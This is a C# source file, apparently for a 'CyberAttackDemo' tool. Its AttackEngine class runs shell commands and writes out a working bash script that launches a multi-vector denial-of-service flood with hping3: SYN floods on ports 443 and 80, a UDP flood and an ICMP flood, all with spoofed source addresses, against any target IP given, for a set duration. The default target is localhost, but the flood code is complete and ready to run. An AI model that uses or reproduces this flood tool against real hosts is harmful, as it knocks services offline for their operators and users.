using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CyberAttackDemo
{
    public class AttackEngine
    {
        public event Action<string>? OnLogReceived;
        
        public const string AttackScriptName = @"./Attack/attack.sh";

        public async Task RunCommandAsync(string command, string args, int timeoutSeconds = 0)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = command,
                    Arguments = args,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8
                };

                using var process = new Process { StartInfo = psi };

                process.OutputDataReceived += (s, e) => 
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        string translated = LogTranslator.Translate(e.Data);
                        OnLogReceived?.Invoke(translated);
                    }
                };
                
                process.ErrorDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        OnLogReceived?.Invoke($"[STDERR] {e.Data}");
                    }
                };

                if (process.Start())
                {
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();

                    if (timeoutSeconds > 0)
                    {
                        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(timeoutSeconds + 2));
                        try
                        {
                            await process.WaitForExitAsync(cts.Token);
                        }
                        catch (OperationCanceledException)
                        {
                            OnLogReceived?.Invoke("[SYSTEM] Process timed out. Forcing kill (Kill Tree)...");
                            try
                            {
                                process.Kill(true);
                            }
                            catch (Exception kex)
                            {
                                OnLogReceived?.Invoke($"[ERROR] Failed to kill process: {kex.Message}");
                            }
                        }
                    }
                    else
                    {
                        await process.WaitForExitAsync();
                    }
                }
            }
            catch (Exception ex)
            {
                OnLogReceived?.Invoke($"[ERROR] Command Execution Failed: {ex.Message}");
                await Task.Delay(1000);
                if (command.Contains("bash"))
                {
                     OnLogReceived?.Invoke("[SIMULATION] Attack script running...");
                }
                else
                {
                    OnLogReceived?.Invoke("Execution failed.");
                }
            }
        }

        public async Task EnsureAttackScriptExistsAsync()
        {
            try
            {
                string? dir = Path.GetDirectoryName(AttackScriptName);
                if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                {
                    Directory.CreateDirectory(dir);
                    OnLogReceived?.Invoke($"[SYSTEM] Created directory: {dir}");
                }

                if (!File.Exists(AttackScriptName))
                {
                    string scriptContent = @"#!/bin/bash
# Usage: ./attack.sh <TARGET_IP> <DURATION> <MODE>
# MODE: 'dos' (hping3 flood)

TARGET=${1:-""127.0.0.1""}
DURATION=${2:-""15""}
MODE=${3:-""dos""}

if [ ""$EUID"" -ne 0 ]; then 
  echo ""[!] WARNING: This script requires root privileges.""
fi

echo ""==========================================""
echo ""[*] TARGET: $TARGET""
echo ""[*] DURATION: ${DURATION}s""
echo ""[*] MODE: $MODE""
echo ""==========================================""

if [ ""$MODE"" = ""dos"" ]; then
    echo ""[*] LAUNCHING MULTI-VECTOR FLOOD ATTACK (hping3)...""
    
    timeout -k 1s ${DURATION}s hping3 -S -p 443 --flood --rand-source $TARGET > /dev/null 2>&1 &
    PID1=$!
    echo ""[+] Vector 1 (TCP/443) Fired (PID: $PID1)""

    timeout -k 1s ${DURATION}s hping3 -S -p 80 --flood --rand-source $TARGET > /dev/null 2>&1 &
    PID2=$!
    echo ""[+] Vector 2 (TCP/80)  Fired (PID: $PID2)""

    timeout -k 1s ${DURATION}s hping3 --udp --flood --rand-source $TARGET > /dev/null 2>&1 &
    PID3=$!
    echo ""[+] Vector 3 (UDP)     Fired (PID: $PID3)""

    timeout -k 1s ${DURATION}s hping3 -1 --flood -d 1200 --rand-source $TARGET > /dev/null 2>&1 &
    PID4=$!
    echo ""[+] Vector 4 (ICMP)    Fired (PID: $PID4)""

    echo ""------------------------------------------""
    echo ""[!] ALL GUNS BLAZING. HOLDING FIRE FOR ${DURATION}s...""
    
    wait $PID1 $PID2 $PID3 $PID4

else
    echo ""[ERROR] Unknown mode: $MODE""
fi

echo ""[*] CEASE FIRE. ATTACK COMPLETE.""
";
                    await File.WriteAllTextAsync(AttackScriptName, scriptContent);
                    try { Process.Start("chmod", $"+x {AttackScriptName}").WaitForExit(); } catch {}
                    OnLogReceived?.Invoke($"[SYSTEM] Generated default attack script: {AttackScriptName}");
                }
                else
                {
                    OnLogReceived?.Invoke($"[SYSTEM] Found existing attack script: {AttackScriptName}");
                }
            }
            catch (Exception ex)
            {
                OnLogReceived?.Invoke($"[ERROR] Failed to check/generate script: {ex.Message}");
            }
        }
    }
}
